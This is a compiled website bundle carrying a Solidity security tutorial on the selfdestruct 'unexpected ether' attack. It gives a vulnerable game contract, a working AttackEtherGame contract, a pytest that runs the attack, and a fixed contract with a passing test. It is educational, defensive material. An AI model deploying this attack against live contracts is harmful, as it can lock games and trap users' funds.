"use strict";(self.webpackChunkbuildany_website=self.webpackChunkbuildany_website||[]).push([[910],{3905:function(e,t,n){n.d(t,{Zo:function(){return d},kt:function(){return m}});var a=n(67294);function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function s(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?s(Object(n),!0).forEach((function(t){r(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):s(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function o(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},s=Object.keys(e);for(a=0;a<s.length;a++)n=s[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var s=Object.getOwnPropertySymbols(e);for(a=0;a<s.length;a++)n=s[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var c=a.createContext({}),l=function(e){var t=a.useContext(c),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},d=function(e){var t=l(e.components);return a.createElement(c.Provider,{value:t},e.children)},u={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},h=a.forwardRef((function(e,t){var n=e.components,r=e.mdxType,s=e.originalType,c=e.parentName,d=o(e,["components","mdxType","originalType","parentName"]),h=l(n),m=r,p=h["".concat(c,".").concat(m)]||h[m]||u[m]||s;return n?a.createElement(p,i(i({ref:t},d),{},{components:n})):a.createElement(p,i({ref:t},d))}));function m(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var s=n.length,i=new Array(s);i[0]=h;var o={};for(var c in t)hasOwnProperty.call(t,c)&&(o[c]=t[c]);o.originalType=e,o.mdxType="string"==typeof e?e:r,i[1]=o;for(var l=2;l<s;l++)i[l]=n[l];return a.createElement.apply(null,i)}return a.createElement.apply(null,n)}h.displayName="MDXCreateElement"},48490:function(e,t,n){n.r(t),n.d(t,{frontMatter:function(){return o},contentTitle:function(){return c},metadata:function(){return l},toc:function(){return d},default:function(){return h}});var a=n(87462),r=n(63366),s=(n(67294),n(3905)),i=["components"],o={sidebar_position:4,tags:["selfdestruct","solidity","attack"]},c="Self destruct",l={unversionedId:"solidity-hacks/self-destruct",id:"solidity-hacks/self-destruct",title:"Self destruct",description:"Description",source:"@site/docs/solidity-hacks/self-destruct.md",sourceDirName:"solidity-hacks",slug:"/solidity-hacks/self-destruct",permalink:"/docs/solidity-hacks/self-destruct",editUrl:"https://github.com/kkateq/blog/docs/solidity-hacks/self-destruct.md",tags:[{label:"selfdestruct",permalink:"/docs/tags/selfdestruct"},{label:"solidity",permalink:"/docs/tags/solidity"},{label:"attack",permalink:"/docs/tags/attack"}],version:"current",sidebarPosition:4,frontMatter:{sidebar_position:4,tags:["selfdestruct","solidity","attack"]},sidebar:"tutorialSidebar",previous:{title:"Underflow",permalink:"/docs/solidity-hacks/underflow"}},d=[{value:"Description",id:"description",children:[],level:3},{value:"How to test",id:"how-to-test",children:[],level:3},{value:"How to fix",id:"how-to-fix",children:[],level:3},{value:"Demo",id:"demo",children:[],level:3}],u={toc:d};function h(e){var t=e.components,n=(0,r.Z)(e,i);return(0,s.kt)("wrapper",(0,a.Z)({},u,n,{components:t,mdxType:"MDXLayout"}),(0,s.kt)("h1",{id:"self-destruct"},"Self destruct"),(0,s.kt)("h3",{id:"description"},"Description"),(0,s.kt)("p",null,"Although the blockchain is considered an immutable structure, Solidity language provides functionality that removes the smart contract state and code from the blockchain. This function is ",(0,s.kt)("inlineCode",{parentName:"p"},"selfdestruct"),", and it could be used to remove the smart contract state and send all  Ether, stored at the address associated with the call, to a designated wallet or contract. This behavior presents the vulnerability, also called ",(0,s.kt)("inlineCode",{parentName:"p"},"unexpected ether"),"."),(0,s.kt)("p",null,"The following smart contract implementation presents the simple game using concurrency logic. Any user can deposit one ether to the contract until the ",(0,s.kt)("inlineCode",{parentName:"p"},"balance")," reaches ",(0,s.kt)("inlineCode",{parentName:"p"},"5"),". Whoever deposited the last ether amounted to the target value will be able to claim the reward. The issue is on line 11, where the requirement uses ",(0,s.kt)("inlineCode",{parentName:"p"},"address(this).balance")," to check the contract balance:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-solidity",metastring:"title=/contracts/self_destruct/EtherGame.sol sourceUrl=https://github.com/kkateq/solidity-hacks/blob/main/contracts/self_destruct/EtherGame.sol",title:"/contracts/self_destruct/EtherGame.sol",sourceUrl:"https://github.com/kkateq/solidity-hacks/blob/main/contracts/self_destruct/EtherGame.sol"},'// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n\ncontract EtherGame {\n    uint256 public targetAmount = 5 ether;\n    address public winner;\n\n    function deposit() public payable {\n        require(msg.value == 1 ether, "You can only send 1 Ether");\n\n         // highlight-next-line\n        uint256 balance = address(this).balance;\n        require(balance <= targetAmount, "Game is over");\n\n        if (balance == targetAmount) {\n            winner = msg.sender;\n        }\n    }\n\n    function claimReward() public {\n        require(msg.sender == winner, "Not winner");\n\n        (bool sent, ) = msg.sender.call{value: address(this).balance}("");\n        require(sent, "Failed to send Ether");\n    }\n\n    function balanceOf() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n')),(0,s.kt)("p",null,"Here comes the ",(0,s.kt)("inlineCode",{parentName:"p"},"AttackEtherGame")," smart contract that would attempt to stop the game by sending ",(0,s.kt)("inlineCode",{parentName:"p"},"unexpected ether")," to the contract game using the ",(0,s.kt)("inlineCode",{parentName:"p"},"selfdestruct")," function:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-solidity",metastring:"title=/contracts/self_destruct/AttackEtherGame.sol sourceUrl=https://github.com/kkateq/solidity-hacks/blob/main/contracts/self_destruct/AttackEtherGame.sol",title:"/contracts/self_destruct/AttackEtherGame.sol",sourceUrl:"https://github.com/kkateq/solidity-hacks/blob/main/contracts/self_destruct/AttackEtherGame.sol"},"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n\ninterface IEtherGame {}\n\ncontract AttackEtherGame {\n    IEtherGame etherGame;\n\n    constructor(address _etherGameAddress) {\n        etherGame = IEtherGame(_etherGameAddress);\n    }\n\n    function attack() public payable {\n        address payable addr = payable(address(etherGame));\n        // highlight-next-line\n        selfdestruct(addr);\n    }\n\n    function deposit() public payable {}\n\n    function balanceOf() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n\n")),(0,s.kt)("h3",{id:"how-to-test"},"How to test"),(0,s.kt)("p",null,"Let's write a unit test that executes the EtherGame attack and verify the game is distorted:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-python",metastring:"sourceUrl=https://github.com/kkateq/solidity-hacks/blob/main/tests/self_destruct/test_self_destruct.py title=/tests/self_destruct/test_self_destruct.py",sourceUrl:"https://github.com/kkateq/solidity-hacks/blob/main/tests/self_destruct/test_self_destruct.py",title:"/tests/self_destruct/test_self_destruct.py"},'import pytest\nfrom brownie import exceptions\nfrom scripts.self_destruct.deploy_and_attack import (\n    deploy_attack_ether_game,\n    deploy_ether_game,\n    deploy_ether_game_fixed,\n)\nfrom scripts.utils import get_attacker_account, get_default_account, get_user_account\nfrom web3 import Web3\n\ndef test_ether_game_successful_attack():\n    # 1. Deploy EtherGame contract\n    ether_game = deploy_ether_game()\n    # 2. Play the game\n    ether_game_deposit_tx = ether_game.deposit(\n        {"from": get_user_account(), "value": Web3.toWei(1, "ether")},\n    )\n    ether_game_deposit_tx.wait(1)\n    # 3. Deploy AttackEtherGame contract\n    attack_ether_game = deploy_attack_ether_game(ether_game.address)\n    # 4. Deposit some funds to the AttackEtherGame contract, so that they could be sent to the EtherGame\n    tx = attack_ether_game.deposit(\n        {"from": get_attacker_account(), "value": Web3.toWei(5, "ether")}\n    )\n    tx.wait(1)\n\n    assert ether_game.balanceOf() / 10**18 == 1\n\n    # 5. Call `attack` function on the AttackEtherGame contract to break the EtherGame balance\n    attack_tx = attack_ether_game.attack(\n        {"from": get_attacker_account()},\n    )\n    attack_tx.wait(1)\n\n    assert ether_game.balanceOf() / 10**18 == 6\n\n    # 6. EtherGame is no longer accepts deposits\n    with pytest.raises(exceptions.VirtualMachineError):\n        ether_game_deposit_tx2 = ether_game.deposit(\n            {"from": get_user_account(), "value": Web3.toWei(1, "ether")},\n        )\n        ether_game_deposit_tx2.wait(1)\n\n')),(0,s.kt)("h3",{id:"how-to-fix"},"How to fix"),(0,s.kt)("p",null,"To fix this issue, it is recommended to avoid reliance on the ",(0,s.kt)("inlineCode",{parentName:"p"},"this.balance")," value within the smart contract logic or guards. Instead, you should use a separate variable ",(0,s.kt)("inlineCode",{parentName:"p"},"balance")," to account for the actual balance every time users call the ",(0,s.kt)("inlineCode",{parentName:"p"},"deposit")," function. Consider the following fix L12-13:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-solidity",metastring:"title=/contracts/self_destruct/EtherGameFixed.sol sourceUrl=https://github.com/kkateq/solidity-hacks/blob/main/contracts/self_destruct/EtherGameFixed.sol",title:"/contracts/self_destruct/EtherGameFixed.sol",sourceUrl:"https://github.com/kkateq/solidity-hacks/blob/main/contracts/self_destruct/EtherGameFixed.sol"},'// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n\ncontract EtherGameFixed {\n    uint256 public targetAmount = 5 ether;\n    address public winner;\n    uint256 public balance;\n\n    function deposit() public payable {\n        require(msg.value == 1 ether, "You can only send 1 Ether");\n\n        // highlight-next-line\n        balance += msg.value;\n        // highlight-next-line\n        require(balance <= targetAmount, "Game is over");\n\n        if (balance == targetAmount) {\n            winner = msg.sender;\n        }\n    }\n\n    function claimReward() public {\n        require(msg.sender == winner, "Not winner");\n\n        (bool sent, ) = msg.sender.call{value: address(this).balance}("");\n        require(sent, "Failed to send Ether");\n    }\n\n    function balanceOf() public view returns (uint256) {\n        return balance;\n    }\n}\n\n')),(0,s.kt)("h3",{id:"demo"},"Demo"),(0,s.kt)("p",null,"The following unit test demonstrates that ",(0,s.kt)("inlineCode",{parentName:"p"},"EtherGameFixed")," smart contract is no longer breakable:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-python",metastring:"sourceUrl=https://github.com/kkateq/solidity-hacks/blob/main/tests/self_destruct/test_self_destruct.py title=/tests/self_destruct/test_self_destruct.py",sourceUrl:"https://github.com/kkateq/solidity-hacks/blob/main/tests/self_destruct/test_self_destruct.py",title:"/tests/self_destruct/test_self_destruct.py"},'...\n\ndef test_ether_game_fixed_failed_attack():\n    # 1. Deploy EtherGameFixed contract\n    ether_game_fixed = deploy_ether_game_fixed()\n    # 2. Play the game\n    ether_game_deposit_tx = ether_game_fixed.deposit(\n        {"from": get_user_account(), "value": Web3.toWei(1, "ether")},\n    )\n    ether_game_deposit_tx.wait(1)\n    # 3. Deploy AttackEtherGame contract\n    attack_ether_game = deploy_attack_ether_game(ether_game_fixed.address)\n    # 4. Deposit some funds to the AttackEtherGame contract, so that they could be sent to the EtherGame\n    tx = attack_ether_game.deposit(\n        {"from": get_attacker_account(), "value": Web3.toWei(5, "ether")}\n    )\n    tx.wait(1)\n    # 5. Call `attack` function on the AttackEtherGame contract to destort the EtherGame balance\n    attack_tx = attack_ether_game.attack(\n        {"from": get_attacker_account()},\n    )\n    attack_tx.wait(1)\n\n    assert ether_game_fixed.balanceOf() / 10**18 == 1\n\n    ether_game_deposit_tx2 = ether_game_fixed.deposit(\n        {"from": get_user_account(), "value": Web3.toWei(1, "ether")},\n    )\n    ether_game_deposit_tx2.wait(1)\n\n    assert ether_game_fixed.balanceOf() / 10**18 == 2\n\n')),(0,s.kt)("p",null,(0,s.kt)("strong",{parentName:"p"},"Thank you for reading and good luck with building secure blockchain!")))}h.isMDXComponent=!0}}]);